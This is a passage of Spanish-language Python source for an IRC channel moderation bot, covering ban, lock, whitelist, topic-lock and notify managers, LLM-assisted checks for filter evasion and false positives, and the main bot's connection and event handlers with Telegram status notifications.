        cola.append(ahora)
        return f"*!*@*{rango}" if len(cola) >= self.threshold else None

    def on_unban(self, canal: str, mask: str) -> None:
        host = mask.split("@")[-1] if "@" in mask else mask
        if len(host) >= 9:
            self._bans[canal].pop(host[-9:], None)

# GESTOR DE LOCK / WHITELIST
#
#  Roles (de menor a mayor):
#    mod   → moderadores.dat          → puede usar !lock on/off/status
#    admin → admins.txt               → puede usar !lock + !wl add/del/list
#    root  → cfg.root_nick/roots.dat  → acceso total
#
#  Persistencia en disco (dentro de db_dir):
#    lock/estado.json          → { "#canal": true/false, ... }
#    lock/whitelist/<canal>.dat → un nick por línea

class GestorLock:
    """Gestiona el estado de !lock y la whitelist por canal con persistencia."""

    def __init__(self, base_dir: Path) -> None:
        self._base        = base_dir / "lock"
        self._wl_dir      = self._base / "whitelist"
        self._estado_path = self._base / "estado.json"
        self._estado: Dict[str, bool] = {}
        self._lock = threading.Lock()
        self._base.mkdir(parents=True, exist_ok=True)
        self._wl_dir.mkdir(parents=True, exist_ok=True)
        self._cargar_estado()

    # estado

    def _cargar_estado(self) -> None:
        try:
            self._estado = json.loads(self._estado_path.read_text(encoding="utf-8"))
        except (FileNotFoundError, ValueError):
            self._estado = {}

    def _guardar_estado(self) -> None:
        self._estado_path.write_text(
            json.dumps(self._estado, ensure_ascii=False, indent=2),
            encoding="utf-8",
        )

    def esta_bloqueado(self, canal: str) -> bool:
        with self._lock:
            return bool(self._estado.get(canal.lower()))

    def bloquear(self, canal: str) -> bool:
        """Devuelve False si ya estaba bloqueado."""
        with self._lock:
            if self._estado.get(canal.lower()):
                return False
            self._estado[canal.lower()] = True
            try:
                self._guardar_estado()
            except Exception:
                logging.error("GestorLock: error al guardar estado tras bloquear %s", canal)
            return True

    def desbloquear(self, canal: str) -> bool:
        """Devuelve False si ya estaba desbloqueado."""
        with self._lock:
            if not self._estado.get(canal.lower()):
                return False
            self._estado[canal.lower()] = False
            try:
                self._guardar_estado()
            except Exception:
                logging.error("GestorLock: error al guardar estado tras desbloquear %s", canal)
            return True

    # whitelist

    def _ruta_wl(self, canal: str) -> Path:
        nombre = canal.lstrip("#").lower().replace("/", "_")
        return self._wl_dir / f"{nombre}.dat"

    def wl_listar(self, canal: str) -> List[str]:
        return leer_lineas(self._ruta_wl(canal))

    @staticmethod
    def _nick_de(valor: str) -> str:
        """Extrae el nick de 'pedro', 'Pedro!*@*' o 'PeDro!user@host' → siempre minúsculas."""
        return valor.strip().split("!")[0].lower()

    @staticmethod
    def mascara_canonica(nick: str) -> str:
        """Pedro, PEDRO, pEdRo → pedro!*@*"""
        return f"{nick.strip().split('!')[0].lower()}!*@*"

    def wl_add(self, canal: str, nick: str) -> bool:
        mascara = self.mascara_canonica(nick)
        if mascara in self.wl_listar(canal):
            return False
        ruta = self._ruta_wl(canal)
        ruta.parent.mkdir(parents=True, exist_ok=True)
        with ruta.open("a", encoding="utf-8") as f:
            f.write(mascara + "\n")
        return True

    def wl_del(self, canal: str, nick: str) -> bool:
        objetivo = self._nick_de(nick)
        lista    = self.wl_listar(canal)
        nuevas   = [n for n in lista if self._nick_de(n) != objetivo]
        if len(nuevas) == len(lista):
            return False
        ruta = self._ruta_wl(canal)
        ruta.write_text("\n".join(nuevas) + ("\n" if nuevas else ""), encoding="utf-8")
        return True

    def en_whitelist(self, canal: str, nick: str) -> bool:
        objetivo = self._nick_de(nick)
        return any(self._nick_de(n) == objetivo for n in self.wl_listar(canal))

# UTILIDADES IRC

def strip_mirc_colors(texto: str) -> str:
    return re.sub(r"(\x03\d{1,2}(,\d{1,2})?)|[\x02\x1F\x16\x0F]", "", texto)

def pct_mayus(texto: str) -> float:
    letras = [c for c in texto if c.isalpha()]
    if len(letras) < 4:
        return 0.0
    return sum(1 for c in letras if c.isupper()) / len(letras) * 100

def paginar(items: List[str], max_chars: int = 300) -> List[str]:
    paginas: List[str] = []
    pagina_actual = ""
    for item in items:
        trozo = f"{item}, "
        if len(pagina_actual) + len(trozo) > max_chars:
            paginas.append(pagina_actual.rstrip(", "))
            pagina_actual = trozo
        else:
            pagina_actual += trozo
    if pagina_actual:
        paginas.append(pagina_actual.rstrip(", "))
    return paginas

# DETECCIÓN DE EVASIÓN POR IA (OpenRouter)

# Detecta patrones como f.o.l.l.a.r / f-o-l-l-a-r / f o l l a r
# Excluye puntos (para no capturar abreviaturas como "e.g.", "i.g.") y guiones comunes
_RE_EVASION = re.compile(
    r"[a-záéíóúüñ](?:[^a-záéíóúüñ\d\s.]{1,2}[a-záéíóúüñ]){3,}",
    re.IGNORECASE,
)

def detectar_fragmento_evasion(texto: str) -> Optional[str]:
    """Devuelve el primer fragmento sospechoso de evasión, o None."""
    coincidencia = _RE_EVASION.search(texto)
    return coincidencia.group(0) if coincidencia else None

# Filtra CJK que modelos de origen asiático (ej: stepfun) pueden colar en el JSON
_RE_CJK = re.compile(
    r"[\u3000-\u9fff\uac00-\ud7ff\uf900-\ufaff\uff00-\uffef]"
)

# ─── Capa IA multi-proveedor (via AI Hub centralizado) ────────────────────────

def _limpiar_respuesta_ia(texto: str) -> str:
    """Limpia la respuesta cruda de la IA antes de parsear JSON."""
    texto = texto.replace("\r", "")
    texto = _RE_CJK.sub("", texto)
    texto = re.sub(r"```(?:json)?|```", "", texto)
    return texto.strip()


def _router_ia(prompt: str, cfg: Any, max_tokens: int = 60, timeout: int = 10) -> Tuple[Optional[str], str]:
    """Router multi-proveedor delegado al AI Hub centralizado."""
    log = logging.getLogger("ia_router")
    resultado, proveedor = ai_hub.call_ai(
        prompt=prompt,
        system_prompt="",
        category="moderation",
        max_tokens=max_tokens,
        timeout=timeout,
    )
    if resultado:
        log.debug("[Router] Respuesta via %s", proveedor)
        return resultado, proveedor
    log.error("[Router] Todos los proveedores fallaron.")
    return None, ""


# ─── Consultas de moderación ──────────────────────────────────────────────────

def consultar_ia_evasion(
    cfg:       Any,
    patrones:  List[str],
    fragmento: str,
    mensaje:   str,
    timeout:   int = 10,
) -> Tuple[bool, str, str]:
    """Pregunta a la IA (via hub centralizado) si hay evasión de patrones."""
    log = logging.getLogger("ia_evasion")
    if not patrones:
        return (False, "", "")

    lista_patrones = ", ".join(patrones)
    prompt = (
        f"Eres un moderador de IRC. Los patrones de palabras prohibidas en el canal son: {lista_patrones}. "
        f"El siguiente mensaje contiene un fragmento sospechoso de evadir el filtro: '{fragmento}'. "
        f"Mensaje completo: '{mensaje}'. "
        f"SOLO marca como evasión si el fragmento está claramente intentando escribir una palabra prohibida "
        f"de forma deliberada (ej: f.o.l.l.a.r, im@becil, estup1da). "
        f"NO marques como evasión si: "
        f"- El fragmento es parte de una palabra normal con signos de puntuación "
        f"- Es un nombre propio, marca o término técnico "
        f"- La coincidencia es accidental "
        f"Responde SOLO con JSON válido, sin texto adicional, sin bloques de código. "
        f"Si es evasión: {{\"evasion\": true, \"patron\": \"patron_evadido\"}}. "
        f"Si no lo es: {{\"evasion\": false, \"patron\": \"\"}}."
    )
    texto, proveedor = _router_ia(prompt, cfg, 60, timeout)
    if not texto:
        return (False, "", "")
    try:
        resultado = json.loads(_limpiar_respuesta_ia(texto))
    except json.JSONDecodeError:
        log.warning("[Evasion] JSON invalido: %s", texto[:80])
        return (False, "", "")
    if resultado.get("evasion"):
        return (True, resultado.get("patron", ""), proveedor)
    return (False, "", proveedor)


def consultar_ia_falso_positivo(
    cfg:       Any,
    tipo:      str,
    patron:    str,
    mensaje:   str,
    subcadena: str = "",
    categoria: str = "",
    timeout:   int = 10,
) -> Tuple[bool, str]:
    """Pregunta a la IA (via hub centralizado) si es infracción real o falso positivo."""
    log = logging.getLogger("ia_falso_positivo")

    if tipo == "spam":
        prompt = (
            f"Eres un moderador de IRC. Se ha detectado que el siguiente mensaje contiene una URL "
            f"no incluida en la whitelist del canal: '{mensaje}'. "
            f"¿Se trata de publicidad/spam real, o podría ser una mención legítima (ej: compartir enlace a noticia, video, etc.)? "
            f"Responde SOLO con JSON válido, sin texto adicional ni bloques de código. "
            f"Si es spam real: {{\"infraccion\": true}}. "
            f"Si es un falso positivo: {{\"infraccion\": false}}."
        )
    else:
        cat = categoria or "contenido inapropiado"
        sub = subcadena or patron
        prompt = (
            f"Eres un moderador de IRC en un canal de conversación general. "
            f"El filtro de '{cat}' ha detectado una posible infracción. "
            f"El patrón prohibido '{patron}' ha coincidido con la subcadena '{sub}' "
            f"dentro del siguiente mensaje: '{mensaje}'. "
            f"IMPORTANTE: En IRC es normal usar lenguaje coloquial, bromas entre usuarios y expresiones informales. "
            f"SOLO debes marcar como infracción si el mensaje es claramente un insulto directo a alguien, "
            f"acoso, amenaza, o contenido genuinamente ofensivo. "
            f"NO marques como infracción si: "
            f"- El usuario está hablando de terceros o citando algo "
            f"- Es una expresión coloquial sin intención de ofender "
            f"- Es una palabra que coincide parcialmente pero en contexto inocente "
            f"Responde SOLO con JSON válido, sin texto adicional ni bloques de código. "
            f"Si es una infracción real: {{\"infraccion\": true}}. "
            f"Si es un falso positivo: {{\"infraccion\": false}}."
        )

    texto, proveedor = _router_ia(prompt, cfg, 40, timeout)
    if not texto:
        log.warning("[FalsoPos] Sin respuesta de IA. No se sanciona (evitar falso positivo).")
        return (False, "")  # sin respuesta → NO sancionar
    try:
        resultado = json.loads(_limpiar_respuesta_ia(texto))
    except json.JSONDecodeError:
        log.warning("[FalsoPos] JSON invalido: %s", texto[:80])
        return (False, "")  # JSON inválido → NO sancionar
    return (bool(resultado.get("infraccion", False)), proveedor)


# GESTOR DE TOPIC LOCK
#
#  Persistencia en disco: lock/topiclock.json
#  Formato: { "#canal": { "activo": true, "topic": "texto del topic" }, ... }

class GestorTopicLock:
    """Guarda el topic protegido por canal y detecta cambios no autorizados."""

    def __init__(self, base_dir: Path) -> None:
        self._ruta = base_dir / "lock" / "topiclock.json"
        self._datos: Dict[str, Dict[str, Any]] = {}
        self._lock = threading.Lock()
        self._cargar()

    def _cargar(self) -> None:
        try:
            self._datos = json.loads(self._ruta.read_text(encoding="utf-8"))
        except (FileNotFoundError, ValueError):
            self._datos = {}

    def _guardar(self) -> None:
        self._ruta.parent.mkdir(parents=True, exist_ok=True)
        self._ruta.write_text(
            json.dumps(self._datos, ensure_ascii=False, indent=2),
            encoding="utf-8",
        )

    def activar(self, canal: str, topic: str) -> None:
        """Activa el lock y guarda el topic actual."""
        with self._lock:
            self._datos[canal.lower()] = {"activo": True, "topic": topic}
            try:
                self._guardar()
            except Exception:
                logging.error("GestorTopicLock: error al guardar tras activar %s", canal)

    def desactivar(self, canal: str) -> None:
        """Desactiva el lock y borra el topic guardado."""
        with self._lock:
            self._datos.pop(canal.lower(), None)
            try:
                self._guardar()
            except Exception:
                logging.error("GestorTopicLock: error al guardar tras desactivar %s", canal)

    def esta_activo(self, canal: str) -> bool:
        with self._lock:
            entrada = self._datos.get(canal.lower())
            return bool(entrada and entrada.get("activo"))

    def topic_guardado(self, canal: str) -> str:
        with self._lock:
            entrada = self._datos.get(canal.lower())
            return entrada["topic"] if entrada else ""


class GestorNotify:
    """Lista de nicks vigilados con persistencia. Comprobación via ISON cada 60s."""
    INTERVALO = 60

    def __init__(self, ruta: Path) -> None:
        self._ruta   = ruta
        self._lock   = threading.Lock()
        self._nicks: List[str] = []          # nicks vigilados (en minúsculas)
        self._estado: Dict[str, bool] = {}   # nick -> True=online, False=offline
        self._cargar()

    def _cargar(self) -> None:
        try:
            self._nicks = [n for n in self._ruta.read_text(encoding="utf-8").splitlines() if n.strip()]
        except FileNotFoundError:
            self._nicks = []

    def _guardar(self) -> None:
        self._ruta.parent.mkdir(parents=True, exist_ok=True)
        self._ruta.write_text("\n".join(self._nicks) + ("\n" if self._nicks else ""), encoding="utf-8")

    def agregar(self, nick: str) -> bool:
        with self._lock:
            nk = nick.lower()
            if nk in self._nicks:
                return False
            self._nicks.append(nk)
            self._guardar()
            return True

    def eliminar(self, nick: str) -> bool:
        with self._lock:
            nk = nick.lower()
            if nk not in self._nicks:
                return False
            self._nicks.remove(nk)
            self._estado.pop(nk, None)
            self._guardar()
            return True

    def listar(self) -> List[str]:
        with self._lock:
            return list(self._nicks)

    def estado(self, nick: str) -> Optional[bool]:
        return self._estado.get(nick.lower())

    def actualizar_estado(self, nick: str, online: bool) -> Optional[bool]:
        """Devuelve el estado anterior si cambió, None si no cambió."""
        nk = nick.lower()
        anterior = self._estado.get(nk)
        self._estado[nk] = online
        if anterior is None or anterior == online:
            return None
        return anterior


# BOT PRINCIPAL

_CmdHandler = Callable[[str, str, List[str]], None]

class IRCBot:
    def _notify_telegram(self, msg: str, is_c2: bool = False, **kwargs) -> None:
        """
        Envía notificaciones a Telegram con separación estricta:
        - is_c2=True: Reportes técnicos de Heartbeat/C2 -> Grupo 1 (-1003808302723)
        - General/Moderación: Todo lo relativo a #Psicologia/#Limbo -> Grupo 2 (-1003723983938)
        """
        def _send():
            # Grupo 1: Heartbeat / C2 / Sistema Técnico
            token1 = "TELEGRAM_TOKEN_C2"
            chat_id1 = "-1003808302723"
            
            # Grupo 2: Todo lo referente a canales IRC (#Psicologia, #Limbo)
            token2 = "TELEGRAM_TOKEN_ADMIN"
            chat_id2 = "-1003723983938"
            
            clean_msg = strip_mirc_colors(msg)
            payload = {"text": f"🤖 <b>{self.cfg.nick}</b>\n{clean_msg}", "parse_mode": "HTML"}
            
            try:
                if is_c2:
                    # Reportes de sistema, conexión, errores críticos técnicos
                    requests.post(f"https://api.telegram.org/bot{token1}/sendMessage", json={**payload, "chat_id": chat_id1}, timeout=5)
                else:
                    # Todo lo demás (Moderación, Comandos, Charla Staff en Limbo)
                    requests.post(f"https://api.telegram.org/bot{token2}/sendMessage", json={**payload, "chat_id": chat_id2}, timeout=5)
            except Exception as e:
                self.log.error(f"Error al enviar notify a Telegram: {e}")
                
        threading.Thread(target=_send, daemon=True).start()


    UMBRAL_MAYUS = 85

    _RAZONES: Dict[str, str] = {
        "spam":  "Publicidad no permitida en el canal. Si es un error, acuda a un moderador (@)",
        "frase": "Temática no permitida en el canal. Si se trata de un error acuda a un moderador (@)",
        "mayus": "El abuso de mayusculas se considera gritar y resulta molesto. Por favor desactivalas, gracias.",
        "repe":  "No repita continuamente lo mismo, con una vez se le entiende, gracias.",
        "insul": "No falte al respeto a los demas usuarios y modere su comportamiento, gracias.",
        "sexo":  "Este no es un canal de tematica sexual, por favor busque otro canal mas acorde a sus gustos.",
        "datos": "No esta permitido facilitar datos personales en el canal, por favor hagalo por privado.",
        "publi": "La publicidad de portales web u otras redes de chat no esta permitida.",
    }
    _FICHEROS_STAFF: Tuple[str, ...] = ("bots.dat", "moderadores.dat", "admins.txt", "roots.dat")

    def __init__(self, cfg: RedConfig, base_dir: Path) -> None:
        self.cfg      = cfg
        self.base_dir = base_dir
        self.log      = logging.getLogger(cfg.nick)
        db_path       = base_dir / (cfg.db_dir or "db/chatzona")

        self.db          = CanalDB(db_path)
        self.avisos      = GestorAvisos()
        self.repes       = GestorRepeticiones()
        self.aka         = GestorAKA(ventana=cfg.aka_ventana)
        self.nicklogger  = NickLogger(db_path / "nicklogger.json")
        self.blista      = BLista(db_path / "blacklist.json")
        self.rango           = GestorRango(cfg.rango_threshold, cfg.rango_ventana, cfg.rango_duracion)
        self.gestor_lock     = GestorLock(db_path)
        self.gestor_topiclock = GestorTopicLock(db_path)
        self.gestor_notify   = GestorNotify(db_path / "notify.dat")
        self.seen            = GestorSeen(db_path / "seen.json")
        self.yt              = YoutubeParser()
        self.quotes          = QuoteManager(db_path / "quotes.json")

        self._reactor      = irc.client.Reactor()
        self._conn: Optional[ServerConn] = None
        self._recon_lock   = threading.Lock()
        self._reconectando = False
        self._notify_gen   = 0   # se incrementa en cada desconexión para invalidar timers huérfanos

        self._whois_sancion: Dict[str, Tuple[str, str, str, str, str]] = {}  # nick -> (canal, tipo, motivo, por, trigger)
        self._whois_add:     Dict[str, Tuple[str, str, str]] = {}
        self._whois_upgrade: Dict[str, List[str]]            = {}
        self._whois_bl:      Dict[str, Tuple[str, str, str]] = {}
        self._whois_unban:   Dict[str, Tuple[str, str]]      = {}  # nick -> (canal, por)
        self._infoban_req:    Dict[str, Tuple[str, str]]      = {}  # nick -> (canal_pedida, por)
        self._whois_notify:  Dict[str, Tuple[str, str]]      = {}  # nick -> (canal_respuesta, contexto)
        self._ops:           Dict[str, Set[str]]             = {}
        # Rastrea TODOS los usuarios del canal (con y sin op) — necesario para !lock on
        self._members:       Dict[str, Set[str]]             = {}
        # Cache de hosts vistos recientemente (nick_lower -> host) para ban+kick en tiempo real
        self._recent_hosts:  Dict[str, str]                  = {}
        # Acumula entradas de ban durante el raw 367 antes de procesar en el 368
        self._banlist_tmp:        Dict[str, List[Tuple[str, float]]] = {}
        self._limpiabans_timers:  Dict[str, threading.Timer]         = {}
        # Reintentos de join fallido: canal -> threading.Timer activo
        self._join_retry_timers:  Dict[str, threading.Timer]         = {}
        # Keepalive PING/PONG
        self._pong_lock:          threading.Lock = threading.Lock()
        self._pong_pending:       bool           = False   # True si esperamos PONG del servidor
        self._limpiando_bans:     Dict[str, bool] = {}     # Flag for !clearbans
        self._last_invite_notify: Dict[str, float] = {}    # nick_lower -> timestamp del último invite via ISON

        # Registro de handlers — persisten a través de reconexiones
        self._registrar_handlers()

    def _registrar_handlers(self) -> None:
        r = self._reactor
        r.add_global_handler("welcome",      self._evt_welcome)
        r.add_global_handler("namreply",     self._evt_namreply)
        r.add_global_handler("whoisuser",    self._evt_whoisuser)
        r.add_global_handler("nosuchnick",   self._evt_nosuchnick)
        r.add_global_handler("join",         self._evt_join)
        r.add_global_handler("kick",         self._evt_kick)
        r.add_global_handler("part",         self._evt_part_quit)
        r.add_global_handler("quit",         self._evt_part_quit)
        r.add_global_handler("mode",         self._evt_mode)
        r.add_global_handler("nick",         self._evt_nick)
        r.add_global_handler("pubmsg",       self._evt_pubmsg)
        r.add_global_handler("privmsg",      self._evt_privmsg)
        r.add_global_handler("disconnect",   self._evt_disconnect)
        r.add_global_handler("banlist",      self._evt_banlist)       # raw 367
        r.add_global_handler("endofbanlist", self._evt_endofbanlist)  # raw 368
        r.add_global_handler("topic",        self._evt_topic)
        # Errores de join
        r.add_global_handler("bannedfromchan",    self._evt_join_error)  # 474
        r.add_global_handler("inviteonlychan",    self._evt_join_error)  # 473
        r.add_global_handler("badchannelkey",     self._evt_join_error)  # 475
        r.add_global_handler("needreggednick",    self._evt_join_error)  # 477
        r.add_global_handler("channelisfull",     self._evt_join_error)  # 471
        r.add_global_handler("ison",              self._evt_ison)        # raw 303
        r.add_global_handler("pong",              self._evt_pong)        # respuesta a PING keepalive

    # Permisos

    def es_root(self, nick: str, hostmask: str = "") -> bool:
        chk = hostmask or nick
        return (
            any(mask_match(chk, entrada) for entrada in self.cfg.root_nick) or
            any(mask_match(chk, entrada) for entrada in self.db.global_listar("roots.dat"))
        )

    def es_admin(self, nick: str, hostmask: str = "") -> bool:
        return self.es_root(nick, hostmask) or \
               any(mask_match(hostmask or nick, entrada) for entrada in self.db.global_listar("admins.txt"))

    def es_staff(self, nick: str, hostmask: str = "") -> bool:
        return self.es_admin(nick, hostmask) or \
               any(mask_match(hostmask or nick, entrada) for entrada in self.db.global_listar("moderadores.dat"))

    def es_op(self, canal: str, nick: str) -> bool:
        return nick.lower() in self._ops.get(canal.lower(), set())

    # Roles para !lock / !wl

    def _rol(self, nick: str, hostmask: str = "") -> str:
        """Devuelve el rol más alto: 'root' | 'admin' | 'mod' | ''."""
        if self.es_root(nick, hostmask):  return "root"
        if self.es_admin(nick, hostmask): return "admin"
        if self.es_staff(nick, hostmask): return "mod"
        return ""

    def _rol_minimo(self, nick: str, hostmask: str, minimo: str) -> bool:
        """True si nick tiene al menos el rol indicado."""
        orden = {"": 0, "mod": 1, "admin": 2, "root": 3}
        return orden.get(self._rol(nick, hostmask), 0) >= orden.get(minimo, 99)

    # Conexión

    def conectar(self) -> None:
        
        ServerConn.buffer_class = buffer.LenientDecodingLineBuffer  # type: ignore[assignment]
        factory = (
            irc.connection.Factory(wrapper=ssl.create_default_context().wrap_socket)
            if self.cfg.ssl else irc.connection.Factory()
        )
        self._conn = self._reactor.server().connect(
            self.cfg.servidor, self.cfg.puerto, self.cfg.nick,
            username     = self.cfg.ident,
            ircname      = self.cfg.realname,
            connect_factory = factory,
        )
        self.log.info("Conectado a %s:%d", self.cfg.servidor, self.cfg.puerto)
        self._notify_telegram(f"✅ Conectado a {self.cfg.servidor}:{self.cfg.puerto}")

    def run(self) -> None:
        """Bucle principal con reconexion automatica ante caidas silenciosas."""
        self.conectar()
        # Iniciar keepalive PING para detectar conexiones muertas
        threading.Thread(target=self._keepalive_ping, daemon=True).start()
        # Iniciar monitor de keepalive para forzar reconexion si no llega PONG
        threading.Thread(target=self._keepalive_monitor, daemon=True).start()
        try:
            self._reactor.process_forever()
        except Exception as exc:
            self.log.error("Reactor finalizo inesperadamente: %s", exc)
            self._notify_telegram(f"❌ <b>Error Crítico:</b> {exc}")
            # Reportar incidente a Cerebro
            enviar_latido(diagnostic=f"Reactor Crash: {exc}")
        # Si llegamos aqui, la conexion cayo — intentar reconectar
        with self._recon_lock:
            if not self._reconectando:
                self._reconectando = True
                self._notify_gen += 1
                threading.Thread(target=self._reconectar, daemon=True).start()

    def _keepalive_ping(self) -> None:
        """Envia PING al servidor periodicamente para detectar conexiones muertas."""
        while True:
            time.sleep(60)  # Cada 60 segundos
            if self._conn and self._conn.connected:
                try:
                    self._conn.send_raw("PING " + self.cfg.servidor)
                    self.log.debug("PING enviado a %s", self.cfg.servidor)
                except Exception as exc:
                    self.log.warning("Error enviando PING: %s", exc)

    def _reconectar(self) -> None:
        """Bucle de reconexión con backoff exponencial hasta 10 minutos."""
        delay = self.cfg.reconectar_seg
        while True:
            self.log.info("Reconectando en %ds...", delay)
            time.sleep(delay)
            try:
                self.conectar()
                with self._recon_lock:
                    self._reconectando = False
                with self._pong_lock:
                    self._pong_pending = False
                return
            except Exception as exc:
                self.log.error("Error al reconectar: %s", exc)
                delay = min(delay * 2, 600)

    def _autenticar(self) -> None:
        """Autenticación via /msg NiCK IDENTIFY password (ChatZona)."""
        if self.cfg.auth_pass and self._conn:
            self._conn.privmsg("NICK", f"IDENTIFY {self.cfg.auth_pass}")

    # Envío

    def pm(self, dest: str, txt: str) -> None:
        target_nick = getattr(self, "_pm_target_nick", None)
        if target_nick and dest == target_nick:
            dest = getattr(self, "_pm_target", dest) or dest
            if "¡Comando Incorrecto!" in txt and "/msg" in txt:
                cmd_name = getattr(self, "_pm_cmd_name", "cmd")
                if cmd_name in ("set", "ayuda", "restart", "backup", "getip", "join"):
                    txt = f"\x034¡Comando Incorrecto!\x03 Sintaxis recomendada: \x0312!{cmd_name} <opción>\x03"
                else:
                    if "add" in txt or "del" in txt:
                        sub_cmd = "add" if "add" in txt else "del"
                        txt = f"\x034¡Comando Incorrecto!\x03 Sintaxis recomendada: \x0312!{cmd_name} {sub_cmd} <nick>\x03 (Ej: !{cmd_name} {sub_cmd} Pedro)"
                    else:
                        txt = f"\x034¡Comando Incorrecto!\x03 Sintaxis recomendada: \x0312!{cmd_name} add/del/list\x03"

        if self._conn:
            try:
                # Truncado de seguridad para evitar error de 512 bytes
                safe_txt = txt[:450] + "..." if len(txt) > 450 else txt
                self._conn.privmsg(dest, safe_txt)
            except Exception as e:
                self.log.error(f"Error crítico enviando PM a {dest}: {e}")

    def notice(self, dest: str, txt: str) -> None:
        if self._conn:
            try:
                # Truncado de seguridad para evitar error de 512 bytes
                safe_txt = txt[:450] + "..." if len(txt) > 450 else txt
                self._conn.notice(dest, safe_txt)
            except Exception as e:
                self.log.error(f"Error crítico enviando NOTICE a {dest}: {e}")

    def kick(self, canal: str, nick: str, motivo: str) -> None:
        """Ban + Kick: primero banea el host, luego expulsa."""
        if not self._conn:
            return
        # Buscar host: primero en cache reciente, luego en nicklogger
        nick_lower = nick.lower()
        host = self._recent_hosts.get(nick_lower, "")
        if not host:
            host = self.nicklogger.host_de_nick(nick) or ""
        if host:
            # Construir banmask: *!*@host
            banmask = f"*!*@{host}"
            try:
                self.modo(canal, "+b", banmask)
                self.log.info(f"Ban puesto a {banmask} en {canal} antes de kick a {nick}")
            except Exception:
                self.log.warning(f"No se pudo poner ban {banmask} para {nick}")
        # Ahora el kick
        try:
            self._conn.kick(canal, nick, motivo)
            self._notify_telegram(f"👢 <b>Expulsión</b> en {canal}: {nick} ({motivo})")
        except Exception:
            self.log.error(f"Error al kick a {nick} de {canal}")

    def modo(self, canal: str, modos: str, *params: str) -> None:
        if self._conn:
            cmd = modos if not params else f"{modos} {' '.join(params)}"
            self._conn.mode(canal, cmd)
            
            # Filtrar notificaciones de Telegram para no saturar
            # Ignorar si el bot se da op o voice a sí mismo
            bot_nick = self.cfg.nick.lower()
            params_lower = [p.lower() for p in params]
            
            is_self_status = (("+o" in modos or "+v" in modos) and bot_nick in params_lower)
            is_ban = "b" in modos
            
            if is_ban or not is_self_status:
                self._notify_telegram(f"⚙️ <b>Modos</b> en {canal}: <code>{cmd}</code>")

    def debug(self, txt: str) -> None:
        if self.cfg.canal_debug:
            self.pm(self.cfg.canal_debug, txt)

    # Handlers de evento
    def _evt_welcome(self, _: ServerConn, event: IRCEvent) -> None:
        
        self._on_welcome()

    def _evt_disconnect(self, _: ServerConn, event: IRCEvent) -> None:
        
        self.log.warning("Desconectado del servidor.")
        self._notify_telegram("⚠️ Desconectado del servidor. Iniciando reconexión...")
        with self._recon_lock:
            if self._reconectando:
                return
            self._reconectando = True
            self._notify_gen += 1  # invalida todos los timers _notify_ciclo en vuelo
        threading.Thread(target=self._reconectar, daemon=True).start()

    def _evt_pong(self, _: ServerConn, event: IRCEvent) -> None:
        """Recibio PONG del servidor — la conexion esta viva."""
        with self._pong_lock:
            self._pong_pending = False
            self.log.debug("PONG recibido del servidor.")

    def _keepalive_monitor(self) -> None:
        """Monitorea la conexion: si no llega PONG en 120s, fuerza la reconexion."""
        while True:
            time.sleep(120)  # Chequear cada 120 segundos
            if self._conn and self._conn.connected:
                with self._pong_lock:
                    if self._pong_pending:
                        self.log.warning("No se recibio PONG en 120s — conexion muerta, reconectando.")
                        # Forzar reconexion cerrando la conexion actual
                        try:
                            self._conn.disconnect()
                        except Exception:
                            pass
                        with self._recon_lock:
                            if not self._reconectando:
                                self._reconectando = True
                                self._notify_gen += 1
                                threading.Thread(target=self._reconectar, daemon=True).start()
                    else:
                        self._pong_pending = True

    def _evt_namreply(self, _: ServerConn, event: IRCEvent) -> None:
        # arguments: ["="|"@"|"*", "#canal", "nick1 @nick2 +nick3 ..."]
        if len(event.arguments) < 3:
            return
        canal = event.arguments[1].lower()
        self._ops.setdefault(canal, set())
        self._members.setdefault(canal, set())
        for token in event.arguments[2].split():
            nick_limpio = token.lstrip("@+").lower()
            self._members[canal].add(nick_limpio)
            if token.startswith("@"):
                self._ops[canal].add(nick_limpio)

    def _evt_whoisuser(self, _: ServerConn, event: IRCEvent) -> None:
        # arguments: [nick, user, host, "*", realname]
        if len(event.arguments) >= 3:
            self._on_whois_311(event.arguments[0], event.arguments[2])

    def _evt_nosuchnick(self, _: ServerConn, event: IRCEvent) -> None:
        if event.arguments:
            self._on_whois_401(event.arguments[0])

    def _evt_join(self, _: ServerConn, event: IRCEvent) -> None:
        nm          = irc.client.NickMask(event.source)
        canal       = event.target
        canal_lower = canal.lower()
        if nm.nick.lower() == self.cfg.nick.lower():
            self._members.setdefault(canal_lower, set())
            threading.Timer(5.0, self._ibl_revisar_canal, args=[canal]).start()
            # Join exitoso — cancelar cualquier timer de reintento pendiente
            timer = self._join_retry_timers.pop(canal_lower, None)
            if timer:
                timer.cancel()
        else:
            self._members.setdefault(canal_lower, set()).add(nm.nick.lower())
            # Cache del host para ban+kick
            nick_lower = nm.nick.lower()
            host_part = nm.host or ""
            if host_part:
                self._recent_hosts[nick_lower] = host_part
            
            # Seen: Registrar entrada
            full_host = f"{nm.nick}!{nm.user}@{nm.host}"
            self.seen.registrar(nm.nick, canal, full_host, "JOIN")
            
            # Seen: Avisar si alguien lo buscó
            busquedas = self.seen.extraer_busquedas(nm.nick)
            for b in busquedas:
                por = b["por"]
                tiempo = format_timesince(b["ts"])
                self.notice(nm.nick, f"\x0312{por}\x03 te estuvo buscando con \x0303!seen\x03 en \x0303{b['canal']}\x03 hace \x0304{tiempo}\x03.")

            self._on_join(nm.nick, full_host, canal)

    def _evt_kick(self, _: ServerConn, event: IRCEvent) -> None:
        kicked       = event.arguments[0] if event.arguments else ""
        canal_lower  = event.target.lower()
        kicked_lower = str(kicked).lower()
        self._ops.get(canal_lower, set()).discard(kicked_lower)
        self._members.get(canal_lower, set()).discard(kicked_lower)
        self._on_kick(event.target, kicked, irc.client.NickMask(event.source).nick)

    def _evt_part_quit(self, _: ServerConn, event: IRCEvent) -> None:
        nm         = irc.client.NickMask(event.source)
        nick_lower = nm.nick.lower()
        motivo     = event.arguments[0] if event.arguments else ""
        canal      = event.target if event.type == "part" else "IRC"
        
        # Registrar en seen
        accion = "PART" if event.type == "part" else "QUIT"
        self.seen.registrar(nm.nick, canal, f"{nm.nick}!{nm.user}@{nm.host}", accion, motivo)

        for grupo in self._ops.values():
            grupo.discard(nick_lower)
        for grupo in self._members.values():
            grupo.discard(nick_lower)

    def _evt_mode(self, _: ServerConn, event: IRCEvent) -> None:
        if not irc.client.is_channel(event.target):
            return
        modos = event.arguments[0] if event.arguments else ""
        tgts  = list(event.arguments[1:]) if len(event.arguments) > 1 else []
        quien = irc.client.NickMask(event.source).nick if event.source else ""
        self._on_mode(event.target.lower(), modos, tgts, quien)

    def _evt_nick(self, _: ServerConn, event: IRCEvent) -> None:
        nm        = irc.client.NickMask(event.source)
        nuevo     = event.target
